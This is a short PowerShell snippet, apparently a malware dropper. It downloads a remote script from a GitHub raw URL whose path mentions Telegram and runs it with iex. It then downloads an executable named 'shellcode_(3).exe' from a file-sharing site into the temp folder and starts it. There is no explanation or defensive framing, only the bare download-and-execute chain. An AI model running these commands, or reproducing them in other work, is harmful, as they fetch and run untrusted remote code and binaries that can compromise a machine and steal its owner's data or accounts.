iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/config.ps1" -useb)

Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
Start-Process -FilePath "$temp\s.exe"
